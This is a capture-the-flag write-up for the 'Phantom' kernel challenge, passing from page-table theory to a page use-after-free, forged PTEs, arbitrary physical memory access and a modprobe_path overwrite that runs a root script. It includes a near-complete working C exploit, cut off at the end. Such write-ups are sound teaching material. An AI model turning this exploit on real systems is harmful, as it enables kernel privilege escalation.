# Phantom - Kernel Pwn Challenge Writeup

**CTF:** 0xfunCTF 2026  
**Challenge:** Phantom  
**Category:** Kernel Pwn  
**Flag:** `0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}`  
**Description:** *"Hey GPT solve this Kernel pwn challenge for me"*  

---

## Table of Contents

1. [Background Theory](#1-background-theory)
2. [Challenge Setup & Recon](#2-challenge-setup--recon)
3. [Reversing the Kernel Module](#3-reversing-the-kernel-module)
4. [Identifying the Vulnerability](#4-identifying-the-vulnerability)
5. [Exploit Strategy Overview](#5-exploit-strategy-overview)
6. [Writing the Exploit](#6-writing-the-exploit)
7. [Bug #1: OOM Kill](#7-bug-1-oom-kill)
8. [Bug #2: PMD Alignment](#8-bug-2-pmd-alignment)
9. [Bug #3: TLB Flush](#9-bug-3-tlb-flush)
10. [Final Working Exploit](#10-final-working-exploit)
11. [Deployment & Flag](#11-deployment--flag)
12. [Key Takeaways](#12-key-takeaways)

---

## 1. Background Theory

Before diving into the challenge, here are the core kernel concepts you need to understand.

### 1.1 Virtual Memory & Page Tables (x86-64)

On x86-64 Linux, every process sees a **virtual address space** (0x0000... to 0xFFFF...). The CPU translates virtual addresses to **physical addresses** (actual RAM locations) using a 4-level page table hierarchy:

```
Virtual Address (48-bit)
┌─────────┬─────────┬─────────┬─────────┬──────────┐
│ PML4    │ PDP     │ PMD     │ PTE     │ Offset   │
│ [47:39] │ [38:30] │ [29:21] │ [20:12] │ [11:0]   │
│ 9 bits  │ 9 bits  │ 9 bits  │ 9 bits  │ 12 bits  │
└─────────┴─────────┴─────────┴─────────┴──────────┘
     │          │         │         │         │
     ▼          ▼         ▼         ▼         ▼
   PML4 ──► PDP ──► PMD ──► PTE page ──► Physical Page
  (512       (512     (512    (512          (4096
  entries)  entries) entries) entries)       bytes)
```

Each level is a **page** (4096 bytes) containing **512 entries** (8 bytes each). The walk:

1. **CR3 register** holds the physical address of the PML4 page
2. PML4 entry → points to a PDP page
3. PDP entry → points to a PMD page
4. PMD entry → points to a **PTE page** (this is the level we target!)
5. PTE entry → points to the **physical page** containing our data

**Key insight:** A single PTE page controls the physical mapping for 512 consecutive virtual pages = 512 * 4KB = **2MB of virtual address space**. This 2MB region is called a **PMD entry's coverage**.

### 1.2 PTE Entry Format

Each PTE entry is 64 bits:

```
Bit  63    : NX (No Execute) — 1 = page not executable
Bits 51-12 : PFN (Page Frame Number) — physical address >> 12
Bit  6     : Dirty — page has been written to
Bit  5     : Accessed — page has been read
Bit  2     : User — accessible from userspace
Bit  1     : R/W — 1 = read/write, 0 = read-only
Bit  0     : Present — 1 = entry is valid

Example: PFN 0x1234, user RW page:
(0x1234 << 12) | Present | RW | User | Accessed | Dirty | NX
= 0x8000000001234067
```

If you can **write to a PTE page**, you control what physical memory a virtual address maps to. This is the core of our exploit.

### 1.3 TLB (Translation Lookaside Buffer)

Walking 4 levels of page tables for every memory access would be extremely slow. So the CPU has a **TLB** — a cache that stores recent virtual→physical translations.

```
CPU wants to access virtual address 0x7f0000001000:
  1. Check TLB: "Do I have a cached translation?"
     → YES: Use cached physical address (fast, ~1 cycle)
     → NO:  Walk page tables (slow, ~100+ cycles), cache result in TLB
```

**The problem:** When we modify PTE entries (to point to different physical pages), the TLB still has the **old** translation cached. The CPU happily uses the stale entry and accesses the **wrong** physical page.

**TLB flush** forces the CPU to discard cached translations and re-walk the page table. On x86-64, TLB flushing requires **kernel privilege** — userspace can't do it directly. We must trick the kernel into flushing for us (more on this in Bug #3).

### 1.4 The Buddy Allocator & Page Allocation

Linux manages physical memory pages using the **buddy allocator**. When you `alloc_pages(order=0)`, the kernel gives you one free 4KB page. When you `__free_pages(page, 0)`, the page goes back to the free list.

Important for exploitation: freed pages get **reused**. If we free a page and then cause the kernel to allocate many pages, our freed page will eventually get allocated for something new — like a **PTE page** for our new memory mappings.

### 1.5 modprobe_path

`modprobe_path` is a kernel global variable (a 256-byte char buffer, default `/sbin/modprobe`). When you try to execute a file with an unknown binary format (not ELF, not a script, etc.), the kernel calls:

```c
call_usermodehelper(modprobe_path, argv, envp, UMH_WAIT_EXEC);
```

This runs whatever is in `modprobe_path` **as root**. If we overwrite it to `/tmp/pwn` and place a script there that copies `/flag` to a world-readable location, we get the flag.

### 1.6 OOM Killer

Linux has a fixed amount of physical RAM. When processes consume all available memory (through `mmap` + page faults), the kernel invokes the **OOM (Out Of Memory) Killer**, which picks a process and terminates it to free memory. In a 256MB QEMU VM, this is very easy to trigger by allocating too many pages.

---

## 2. Challenge Setup & Recon

### 2.1 Challenge Files

```
Phantom/
├── bzImage              # Compressed Linux kernel
├── initramfs.cpio.gz    # Root filesystem (initramfs)
├── phantom.ko           # Vulnerable kernel module
├── run.sh               # QEMU launch script
└── interface.h          # IOCTL command definitions
```

### 2.2 Analyzing run.sh

```sh
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \                                           # Only 256MB RAM!
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -append "console=ttyS0 oops=panic panic=1 quiet kaslr" \  # KASLR enabled
    -cpu qemu64,+smep,+smap \                           # SMEP + SMAP enabled
    -monitor /dev/null \
    -nographic \
    -no-reboot
```

**Security mitigations:**
- **KASLR** — Kernel Address Space Layout Randomization. Kernel base address is randomized on each boot.
- **SMEP** — Supervisor Mode Execution Prevention. Kernel can't execute userspace code.
- **SMAP** — Supervisor Mode Access Prevention. Kernel can't read/write userspace memory.
- **256MB RAM** — Very tight memory budget. Important for exploit reliability.

### 2.3 Extracting the Initramfs

To understand the environment:

```bash
mkdir /tmp/phantom_initramfs && cd /tmp/phantom_initramfs
gunzip -c /path/to/initramfs.cpio.gz | cpio -idmv
cat init
```

The init script:

```sh
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp
chmod 777 /tmp
insmod /home/ctf/phantom.ko     # Load the vulnerable module
chmod 666 /dev/phantom          # World-accessible device
setsid cttyhack setuidgid 1000 sh   # Shell as UID 1000 (unprivileged)
```

Key findings:
- We get a shell as **UID 1000** (not root)
- `/dev/phantom` is accessible by everyone (mode 666)
- `/tmp` is writable
- The flag is at `/flag` (root-readable only)

### 2.4 Checking interface.h

```c
#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702
```

Two ioctl commands. Simple interface.

### 2.5 Local Testing with QEMU

To test locally:

```bash
# Start QEMU
./run.sh

# In another terminal, you can test manually
# But for remote, we need to compile and upload
```

### 2.6 Dynamic Analysis with pwndbg

For understanding the module behavior at runtime, we can attach GDB to QEMU:

```bash
# Start QEMU with GDB stub (add to run.sh):
#   -s    (shorthand for -gdb tcp::1234)

# In another terminal:
gdb vmlinux
target remote :1234

# Useful pwndbg commands:
break *0x<phantom_alloc_handler_addr>   # Break on ioctl handlers
continue

# When hit:
x/10gx $rdi           # Examine struct contents
p/x $rax              # Check return values
bt                     # Backtrace

# Memory examination:
x/512gx <pte_page_addr>   # View PTE entries
info registers cr3         # Page table root

# Check module is loaded:
lsmod
cat /proc/modules          # Inside QEMU
```

To find function addresses in the module for breakpoints:

```bash
# On host, find offsets:
objdump -d phantom.ko | less

# In GDB, find module base:
# (inside QEMU shell) cat /proc/modules
# phantom 16384 0 - Live 0xffffffffc0000000
# Then add offsets to base address
```

---

## 3. Reversing the Kernel Module

### 3.1 Disassembly with objdump

```bash
objdump -d phantom.ko > phantom.asm
objdump -t phantom.ko    # Symbol table
strings phantom.ko        # Interesting strings
```

From `strings`:
```
phantom
/dev/phantom
```

From the symbol table, we can identify key functions like the ioctl handler, mmap handler, and init/exit functions.

### 3.2 Static Analysis with Ghidra

Load `phantom.ko` into Ghidra for decompilation. The key functions:

**ioctl handler (CMD_ALLOC):**
```c
// Pseudocode from reverse engineering
case CMD_ALLOC:
    struct phantom_data *data = kmalloc(24, GFP_KERNEL);
    struct page *page = alloc_pages(GFP_KERNEL | __GFP_ZERO, 0);  // Order-0 = single page
    void *virt = page_address(page);
    memset(virt, 0x41, PAGE_SIZE);   // Fill page with 'A's
    data->page = page;
    data->virt_addr = virt;
    data->locked = 0;
    file->private_data = data;
    break;
```

**ioctl handler (CMD_FREE):**
```c
case CMD_FREE:
    struct phantom_data *data = file->private_data;
    if (data && data->page) {
        __free_pages(data->page, 0);    // Free the physical page
        data->locked = 1;               // Set locked flag
        // NOTE: Does NOT destroy the userspace mmap mapping!
        // NOTE: Does NOT set data->page = NULL!
    }
    break;
```

**mmap handler:**
```c
static int phantom_mmap(struct file *file, struct vm_area_struct *vma) {
    struct phantom_data *data = file->private_data;
    if (!data || !data->page) return -EINVAL;

    unsigned long pfn = page_to_pfn(data->page);
    return remap_pfn_range(vma, vma->vm_start, pfn, PAGE_SIZE, vma->vm_page_prot);
    // remap_pfn_range: maps physical page to userspace
    // Sets VM_PFNMAP — does NOT hold a reference on struct page
}
```

---

## 4. Identifying the Vulnerability

The vulnerability is a **page-level Use-After-Free (UAF)**.

### The Bug

```
Timeline:
1. CMD_ALLOC  → Kernel allocates a physical page, stores pointer
2. mmap()     → remap_pfn_range() maps that physical page into userspace
                (userspace can now read/write the page via the mapping)
3. CMD_FREE   → __free_pages() returns the page to the buddy allocator
                BUT: the userspace mapping still exists!
                The mapping was created with remap_pfn_range() which sets
                VM_PFNMAP — it doesn't hold a reference on struct page.

After step 3:
- The physical page is FREE (kernel can give it to anyone)
- Userspace STILL has a valid mapping to that physical address
- Userspace can READ and WRITE to whatever the kernel puts there
```

This is different from a heap UAF (which is about `kmalloc`/`kfree` objects). Here, an entire **physical page** is freed but remains mapped. Whatever the kernel reuses that page for, we can read/write it from userspace.

### Why is this powerful?

If the freed page gets reused as a **PTE page** (page table entry page), we can:
1. Read PTE entries → leak physical addresses
2. Write PTE entries → map arbitrary physical memory into our virtual address space
3. With arbitrary physical memory read/write → find and overwrite `modprobe_path`

---

## 5. Exploit Strategy Overview

```
Step 1: Trigger page UAF
    → open /dev/phantom, CMD_ALLOC, mmap, CMD_FREE

Step 2: Spray PTE pages
    → Allocate many 2MB anonymous memory regions
    → Each 2MB region needs a PTE page (512 entries * 4KB = 2MB)
    → Eventually, our freed page gets reused as a PTE page

Step 3: Verify reclaim
    → Read through UAF mapping: PTE entries have distinctive bit patterns
    → (pfn << 12) | flags — bits 0,1,2 set (Present|RW|User) = 0x7

Step 4: Identify which 2MB chunk uses our PTE page
    → MADV_DONTNEED on each chunk, check if UAF page changes

Step 5: Scan physical memory for modprobe_path
    → Forge PTEs via UAF to point to every physical page
    → Read through the target chunk to access arbitrary physical memory
    → Search for "/sbin/modprobe\0" string

Step 6: Overwrite modprobe_path
    → Forge a PTE pointing to the page containing modprobe_path
    → Write "/tmp/pwn\0" through the target mapping

Step 7: Trigger modprobe
    → Create /tmp/pwn script that copies /flag
    → Execute a file with invalid format (triggers modprobe as root)

Step 8: Read flag
```

---

## 6. Writing the Exploit

### Step 1: Trigger the UAF

```c
int fd = open("/dev/phantom", O_RDWR);
ioctl(fd, CMD_ALLOC, 0);                     // Allocate page

volatile uint64_t *uaf = mmap(NULL, PAGE_SIZE,
    PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); // Map it to userspace
printf("val = 0x%lx\n", uaf[0]);              // Should be 0x4141414141414141

ioctl(fd, CMD_FREE, 0);                       // Free page — mapping persists!
// uaf pointer still works — this is the UAF
```

After `CMD_FREE`, the page is in the buddy allocator's free list, but `uaf` still points to it. Whatever the kernel uses this page for next, we can read and write it.

### Step 2: Spray PTE Pages

We need the kernel to allocate PTE pages that reuse our freed page. Each new 2MB virtual memory region requires one PTE page.

```c
#define SPRAY_CHUNKS 16
#define PMD_SIZE     0x200000UL   // 2MB
#define PTE_ENTRIES  512

for (int c = 0; c < SPRAY_CHUNKS; c++) {
    spray[c] = alloc_pmd_aligned();   // Allocate 2MB, PMD-aligned
    madvise(spray[c], PMD_SIZE, MADV_NOHUGEPAGE);  // Force 4KB pages (= PTE pages)

    // Touch every page to force PTE creation
    for (int p = 0; p < PTE_ENTRIES; p++)
        *(volatile char *)(spray[c] + (size_t)p * PAGE_SIZE) = 0;

    // Check if our freed page was reclaimed as a PTE page
    int valid = 0;
    for (int i = 0; i < PTE_ENTRIES; i++)
        if ((uaf[i] & 7) == 7) valid++;   // Present|RW|User = 0x7

    if (valid >= 256) {
        printf("[+] Reclaimed after %d chunks!\n", c+1);
        break;
    }
}
```

**Why `(uaf[i] & 7) == 7`?** PTE entries for user-accessible, writable, present pages have bits 0, 1, and 2 set. Random data is unlikely to have this pattern in most of its 512 entries, but a real PTE page will.

### Step 3-4: Find the Target Chunk

We need to know **which** of our spray chunks is mapped through our UAF PTE page. We do this by disrupting each chunk and checking if the UAF page changes:

```c
for (int i = 0; i < spray_count; i++) {
    uint64_t before = uaf[0];
    madvise(spray[i], PAGE_SIZE, MADV_DONTNEED);  // Discard first page
    if (uaf[0] != before) {
        // This chunk's PTE was affected — it uses our UAF page!
        tidx = i;
        *(volatile char *)spray[i] = 0;   // Re-fault to restore PTE
        break;
    }
}
```

`MADV_DONTNEED` tells the kernel to discard the page and zero the PTE entry. If `uaf[0]` changes, that means spray chunk `i`'s first PTE entry is at `uaf[0]` — confirming it uses our UAF PTE page.

### Step 5: Scan Physical Memory

This is where we forge PTEs to scan all physical memory:

```c
const char *needle = "/sbin/modprobe";

for (uint64_t bp = 0; bp < SCAN_MAX_PFN; bp += PTE_ENTRIES) {
    // Flush TLB (so CPU re-reads our forged PTEs)
    flush_tlb_range(tgt, PMD_SIZE);

    // Write forged PTEs: map target chunk pages to physical pages we want to read
    for (int i = 0; i < PTE_ENTRIES; i++)
        uaf[i] = make_pte(bp + i);   // (pfn << 12) | flags

    // Now reading tgt[i*4096] reads physical page (bp+i)
    for (int i = 0; i < PTE_ENTRIES; i++) {
        char *pg = tgt + (size_t)i * PAGE_SIZE;
        // Search this physical page for "/sbin/modprobe\0"
        for (int o = 0; o <= PAGE_SIZE - nlen; o++) {
            if (memcmp(pg + o, needle, nlen) == 0 && pg[o+nlen] == '\0') {
                // Found it! But is it the writable modprobe_path or .rodata?
                // Check: writable buffer has ~100 zero bytes after the string
                // .rodata has other strings packed right after
                ...
            }
        }
    }
}
```

**Each iteration scans 512 physical pages (2MB).** With SCAN_MAX_PFN = 0x10000 (256MB / 4KB), we scan all physical memory in ~128 iterations.

### Step 6-8: Overwrite and Trigger

```c
// Point PTE to the page containing modprobe_path
flush_tlb_range(tgt, PMD_SIZE);
uaf[0] = make_pte(found_pfn);
strcpy(tgt + found_offset, "/tmp/pwn");   // Overwrite modprobe_path!

// Clean up forged PTEs
uaf[0] = 0;
mprotect(tgt, PMD_SIZE, PROT_READ|PROT_WRITE);

// Create the payload script
FILE *f = fopen("/tmp/pwn", "w");
fprintf(f, "#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag\n");
fclose(f);
chmod("/tmp/pwn", 0777);

// Trigger: execute a file with invalid binary format
f = fopen("/tmp/boom", "w");
fputs("\xff\xff\xff\xff", f);  // Not ELF, not script — unknown format
fclose(f);
chmod("/tmp/boom", 0777);

// Fork + exec the invalid binary
pid_t p = fork();
if (p == 0) { execl("/tmp/boom", "/tmp/boom", NULL); _exit(0); }
waitpid(p, NULL, 0);
usleep(300000);

// /tmp/pwn ran as root, /flag should be copied
system("cat /tmp/flag");
```

---

## 7. Bug #1: OOM Kill

### The Problem

The first version of the exploit used 48 spray chunks with `MAP_POPULATE`:

```c
#define SPRAY_CHUNKS 48
// ...
mmap(..., MAP_POPULATE, ...);  // Immediately fault in ALL pages
```

**48 chunks * 2MB = 96MB** of immediately-allocated physical memory. The VM only has 256MB total, with the kernel using ~50MB. This left maybe ~110MB free — and 96MB of spray plus the kernel's ongoing allocations pushed us over the edge.

### The Symptom

```
[*] Spraying 48 x 2MB (PMD-aligned) ...
Killed
```

The Linux **OOM Killer** terminated our process. When the system runs out of physical memory, the kernel picks the biggest memory consumer and kills it with SIGKILL.

### The Fix

1. **Reduced spray to 16 chunks** (32MB — well within budget)
2. **Removed `MAP_POPULATE`** — touch pages individually instead
3. **Added early exit** — stop spraying as soon as reclaim is detected

```c
#define SPRAY_CHUNKS 16

for (int c = 0; c < SPRAY_CHUNKS; c++) {
    spray[c] = alloc_pmd_aligned();
    madvise(spray[c], PMD_SIZE, MADV_NOHUGEPAGE);

    // Touch pages one by one (instead of MAP_POPULATE)
    for (int p = 0; p < PTE_ENTRIES; p++)
        *(volatile char *)(spray[c] + (size_t)p * PAGE_SIZE) = 0;

    // Check immediately — stop if reclaimed
    int valid = 0;
    for (int i = 0; i < PTE_ENTRIES; i++)
        if ((uaf[i] & 7) == 7) valid++;
    if (valid >= 256) break;   // Don't waste memory!
}
```

In practice, reclaim typically happens after just **1-2 chunks** because the freed page sits at the top of the per-CPU free list and gets grabbed quickly.

### Lesson Learned

In memory-constrained VMs (common in kernel CTF challenges), always be conservative with memory allocations. Check `cat /proc/meminfo` on the remote to know your budget:

```
MemTotal:       221632 kB   (~216 MB total)
MemFree:        207000 kB   (~202 MB free before exploit)
```

---

## 8. Bug #2: PMD Alignment

### The Problem

After fixing the OOM issue, the spray succeeded but we couldn't identify which chunk was using our PTE page:

```
[+] Reclaimed after 2 chunks (512/512 PTE entries)
[*] PTE-like entries: 512/512
[+] UAF page is now a PTE page
[-] chunk not found
```

### Understanding PMD Alignment

Remember the page table hierarchy. A **PMD entry** covers 2MB of virtual address space and points to one **PTE page**. The PTE page has 512 entries, each mapping a 4KB page.

The mapping from virtual address to PTE **index** is:

```
PTE index = (virtual_address >> 12) & 0x1FF
```

For this to work cleanly, our 2MB chunk must start at a **2MB-aligned** virtual address:

```
2MB-aligned:     0x7f0000200000
  PTE index of first page: (0x7f0000200000 >> 12) & 0x1FF = 0x000 & 0x1FF = 0
  PTE index of last page:  (0x7f00003FF000 >> 12) & 0x1FF = 0x1FF = 511
  → All 512 pages use indices 0-511 in ONE PTE page ✓

NOT 2MB-aligned: 0x7f0000201000
  PTE index of first page: (0x7f0000201000 >> 12) & 0x1FF = 0x001 = 1
  PTE index of page 511:   wraps around to index 0 in the NEXT PTE page!
  → Pages span TWO PTE pages ✗
```

When `mmap` returns a non-2MB-aligned address, our chunk's pages are split across **two different PTE pages**. The identification code checks `uaf[0]` (PTE index 0), but the chunk's first page might be at index 147, not 0.

### The Symptom

The MADV_DONTNEED test modifies the PTE for the chunk's first page. If that PTE is at index 147 (not 0), then `uaf[0]` doesn't change, and we never detect it.

### The Fix

Force 2MB alignment by allocating extra and trimming:

```c
static char *alloc_pmd_aligned(void) {
    // Allocate 4MB (guaranteed to contain a 2MB-aligned region)
    char *raw = mmap(NULL, 2 * PMD_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (raw == MAP_FAILED) return MAP_FAILED;

    // Find the 2MB-aligned address within our 4MB region
    char *aligned = (char *)(((uintptr_t)raw + PMD_SIZE - 1) & ~(PMD_SIZE - 1));

    // Unmap the prefix (before aligned region)
    if (aligned > raw)
        munmap(raw, aligned - raw);

    // Unmap the suffix (after aligned region)
    char *aend = aligned + PMD_SIZE;
    char *rend = raw + 2 * PMD_SIZE;
    if (aend < rend)
        munmap(aend, rend - aend);

    return aligned;  // Exactly 2MB, 2MB-aligned
}
```

**Visual:**
```
raw mmap (4MB):     [.........|=========|.........]
                     prefix    aligned    suffix
                     (unmap)   (keep)     (unmap)
                              ↑
                              2MB boundary
```

Now each chunk's first page is at PTE index 0, and the identification code works correctly.

### Lesson Learned

When exploiting page table structures, alignment matters. On x86-64:
- 4KB alignment = page boundary
- 2MB alignment = PMD boundary (one PTE page)
- 1GB alignment = PDP boundary (one PMD page)

Standard `mmap` only guarantees page (4KB) alignment. For larger alignments, allocate extra and trim.

---

## 9. Bug #3: TLB Flush

This was the hardest bug to find and understand.

### The Problem

After fixing OOM and alignment, the spray and chunk identification work perfectly, but the physical memory scan finds **nothing**:

```
[+] Reclaimed after 1 chunks (512/512 PTE entries)
[+] Target chunk 0 at 0x7f2b96800000
[*] Scanning for modprobe_path ...
  ... PFN 0x0000 / 0x10000
  ... PFN 0x4000 / 0x10000
  ... PFN 0x8000 / 0x10000
  ... PFN 0xc000 / 0x10000
[*] Trying cred overwrite ...
[-] failed
```

It scanned all 256MB and found nothing — not even `/sbin/modprobe` which MUST exist somewhere in kernel memory.

### Understanding the Original Scan Loop

The original (broken) approach for each batch of 512 physical pages:

```
1. MADV_DONTNEED on target chunk   → zeros PTEs, (supposedly) flushes TLB
2. Write forged PTEs via UAF       → point to physical pages we want to scan
3. Read target chunk pages          → should access the forged physical pages
4. Zero PTEs via UAF               → uaf[i] = 0  (clear forged entries)
5. Touch target pages              → should trigger page faults, install real PTEs
6. Go to step 1 for next batch
```

### Why It Broke: The Stale TLB Problem

**Iteration 1** works correctly:
- MADV_DONTNEED clears PTEs and flushes TLB (fresh start)
- We write forged PTEs pointing to physical pages 0-511
- We read through target — CPU walks page table, finds forged PTEs, caches translations in TLB
- We zero PTEs (uaf[i] = 0), but **TLB still has cached translations!**
- We "touch" pages at step 5, but CPU uses stale TLB entries → writes go to the **forged physical pages**, not new ones. **No page fault occurs!**

**Iteration 2** fails:
- MADV_DONTNEED runs on the target chunk
- The kernel's `zap_page_range()` walks the page table for this VMA
- All PTEs are 0 (we zeroed them), so the kernel finds **no present pages** to zap
- Internally: `tlb->end` stays 0 → `tlb_flush_mmu_tlbonly()` says "nothing to flush" → **TLB flush is SKIPPED**
- We write new forged PTEs (pages 512-1023)
- We read target pages, but CPU still uses **TLB from iteration 1** pointing to pages 0-511!
- We're reading the same pages over and over, never making progress

This is why the scan "completes" without finding anything — it's reading the first 512 physical pages 128 times instead of scanning 128 different batches.

### The Fix: mprotect() TLB Flush

Instead of the MADV_DONTNEED cycle, use `mprotect()` to force a TLB flush:

```c
static int prot_state = 1; /* 1 = RW, 0 = R */

static void flush_tlb_range(char *addr, size_t len) {
    if (prot_state) {
        mprotect(addr, len, PROT_READ);
        prot_state = 0;
    } else {
        mprotect(addr, len, PROT_READ|PROT_WRITE);
        prot_state = 1;
    }
}
```

**Why this works:**

1. `mprotect()` walks the page table for the target VMA
2. For each **present** PTE entry (our forged ones ARE present, bit 0 is set), it modifies the permission bits
3. After modifying PTEs, it calls `flush_tlb_range()` in the kernel to invalidate the TLB entries
4. On the next access, the CPU re-walks the page table and picks up our newly-written forged PTEs

**Why we alternate permissions:** The kernel's `mprotect_fixup()` function has an early return:

```c
// In mm/mprotect.c
if (newflags == oldflags) {
    // No change needed — return without walking page table
    return 0;
}
```

If we call `mprotect(PROT_READ)` twice, the second call returns early without flushing. By alternating between `PROT_READ` and `PROT_READ|PROT_WRITE`, we guarantee the flags always change.

### The Simplified Scan Loop

```
Initial: MADV_DONTNEED (clears real PTEs + flushes TLB)

For each batch:
    1. mprotect() toggle  (flushes TLB for forged PTEs)
    2. Write new forged PTEs via UAF
    3. Read + search 512 physical pages through target mapping
    (No cleanup needed — mprotect handles TLB next iteration)
```

Much simpler, and every iteration reliably reads the correct physical pages.

### Lesson Learned

**TLB is invisible but critical.** When modifying page tables from userspace (via UAF), the CPU may still use cached translations. You MUST flush the TLB between modifications. The only reliable userspace method is `mprotect()` with changing flags — it's the only syscall that walks existing PTEs (even forged ones) and flushes TLB as a side effect.

---

## 10. Final Working Exploit

The final exploit.c with all three bugs fixed:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>

#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702

#define PAGE_SIZE    0x1000UL
#define PMD_SIZE     0x200000UL
#define PTE_ENTRIES  512

#define PTE_PRESENT  (1UL << 0)
#define PTE_RW       (1UL << 1)
#define PTE_USER     (1UL << 2)
#define PTE_ACCESSED (1UL << 5)
#define PTE_DIRTY    (1UL << 6)
#define PTE_NX       (1UL << 63)
#define PTE_FLAGS    (PTE_PRESENT | PTE_RW | PTE_USER | PTE_ACCESSED | PTE_DIRTY | PTE_NX)

#define SPRAY_CHUNKS  16
#define SCAN_MAX_PFN  0x10000   /* 256MB = 0x10000 pages */

static inline uint64_t make_pte(uint64_t pfn) {
    return (pfn << 12) | PTE_FLAGS;
}

void die(const char *s) { perror(s); exit(1); }

/* Allocate exactly 2MB of virtual memory, aligned to a 2MB boundary.
 * This ensures all 512 pages fall within a single PMD entry (one PTE page). */
static char *alloc_pmd_aligned(void) {
    char *raw = mmap(NULL, 2 * PMD_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (raw == MAP_FAILED) return MAP_FAILED;
    char *aligned = (char *)(((uintptr_t)raw + PMD_SIZE - 1) & ~(PMD_SIZE - 1));
    if (aligned > raw) munmap(raw, aligned - raw);
    char *aend = aligned + PMD_SIZE;
    char *rend = raw + 2 * PMD_SIZE;
    if (aend < rend) munmap(aend, rend - aend);
    return aligned;
}

/* Flush TLB by toggling mprotect permissions.
 * Must alternate because mprotect returns early if flags unchanged. */
static int prot_state = 1;
static void flush_tlb_range(char *addr, size_t len) {
    if (prot_state) {
        mprotect(addr, len, PROT_READ);
        prot_state = 0;
    } else {
        mprotect(addr, len, PROT_READ|PROT_WRITE);
        prot_state = 1;
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Phantom exploit: page UAF -> PTE spray -> arb phys R/W\n");

    /* Step 1: Trigger page UAF */
    int fd = open("/dev/phantom", O_RDWR);
    if (fd < 0) die("open");

    ioctl(fd, CMD_ALLOC, 0);
    volatile uint64_t *uaf = mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (uaf == MAP_FAILED) die("mmap uaf");
    printf("[+] UAF map %p  val=0x%lx\n", (void*)uaf, uaf[0]);

    ioctl(fd, CMD_FREE, 0);
    printf("[+] Page freed, mapping persists\n");

    /* Step 2: Spray PTE pages */
    char *spray[SPRAY_CHUNKS];
    int spray_count = 0;
    for (int c = 0; c < SPRAY_CHUNKS; c++) {
        spray[c] = alloc_pmd_aligned();
        if (spray[c] == MAP_FAILED) break;
        madvise(spray[c], PMD_SIZE, MADV_NOHUGEPAGE);
        for (int p = 0; p < PTE_ENTRIES; p++)
            *(volatile char *)(spray[c] + (size_t)p * PAGE_SIZE) = 0;
        spray_count++;

        int valid = 0;
        for (int i = 0; i < PTE_ENTRIES; i++)
            if ((uaf[i] & 7) == 7) valid++;
        if (valid >= 256) {
            printf("[+] Reclaimed after %d chunks\n", c+1);
            break;
        }
    }

    /* Step 3: Verify */
    int valid = 0;
    for (int i = 0; i < PTE_ENTRIES; i++)
        if ((uaf[i] & 7) == 7) valid++;
    if (valid < 64) { printf("[-] spray failed\n"); return 1; }

    /* Step 4: Find target chunk */
    int tidx = -1;
    for (int i = 0; i < spray_count; i++) {
        uint64_t before = uaf[0];
        madvise(spray[i], PAGE_SIZE, MADV_DONTNEED);
        if (uaf[0] != before) {
            tidx = i;
            *(volatile char *)spray[i] = 0;
            break;
        }
    }
    if (tidx < 0) { printf("[-] chunk not found\n"); return 1; }
    char *tgt = spray[tidx];

    for (int i = 0; i < spray_count; i++)
        if (i != tidx) munmap(spray[i], PMD_SIZE);

    /* Step 5: Scan physical memory for modprobe_path */
    const char *needle = "/sbin/modprobe";
    int nlen = strlen(needle);
    uint64_t fpfn = 0;
    int foff = -1;

    madvise(tgt, PMD_SIZE, MADV_DONTNEED);

    for (uint64_t bp = 0; bp < SCAN_MAX_PFN && foff < 0; bp += PTE_ENTRIES) {
        if (bp > 0) flush_tlb_range(tgt, PMD_SIZE);

        for (int i = 0; i < PTE_ENTRIES; i++)
            uaf[i] = make_pte(bp + i);

        for (int i = 0; i < PTE_ENTRIES && foff < 0; i++) {
            char *pg = tgt + (size_t)i * PAGE_SIZE;
            for (int o = 0; o <= (int)PAGE_SIZE - nlen; o++) {
                if (memcmp(pg + o, needle, nlen) == 0 && pg[o+nlen]=='\0') {
                    /* Distinguish writable modprobe_path from .rodata:
                     * The 256-byte buffer has ~100 zero bytes after the string.
                     * .rodata has other strings packed right after. */
                    int zeros = 0;
                    int end = o + nlen + 1;
                    int lim = (int)PAGE_SIZE < end + 100 ? (int)PAGE_SIZE : end + 100;
                    for (int z = end; z < lim; z++)
                        if (pg[z] == 0) zeros++;
                    if (zeros < 60) continue;  // .rodata match, skip

                    fpfn = bp + i;
                    foff = o;
                    printf("[+] Found modprobe_path at PFN 0x%lx +0x%x\n", fpfn, foff);
                    break;
                }
            }
        }
    }

    if (foff < 0) { printf("[-] not found\n"); return 1; }

    /* Step 6: Overwrite modprobe_path */
    flush_tlb_range(tgt, PMD_SIZE);
    uaf[0] = make_pte(fpfn);
    strcpy(tgt + foff, "/tmp/pwn");

    uaf[0] = 0;
    mprotect(tgt, PMD_SIZE, PROT_READ|PROT_WRITE);

    /* Step 7: Trigger modprobe */
    FILE *f = fopen("/tmp/pwn", "w");
    fprintf(f, "#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag\n");
    fclose(f);
    chmod("/tmp/pwn", 0777);

    f = fopen("/tmp/boom", "w");
    fputs("\xff\xff\xff\xff", f);
    fclose(f);
    chmod("/tmp/boom", 0777);

    pid_t p = fork();
    if (p == 0) { execl("/tmp/boom", "/tmp/boom", NULL); _exit(0); }
    waitpid(p, NULL, 0);
    usleep(300000);

    /* Step 8: Read flag */
    f = fopen("/tmp/flag", "r");
    if (f) {
        char buf[256];
        while (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
        fclose(f);
    } else {
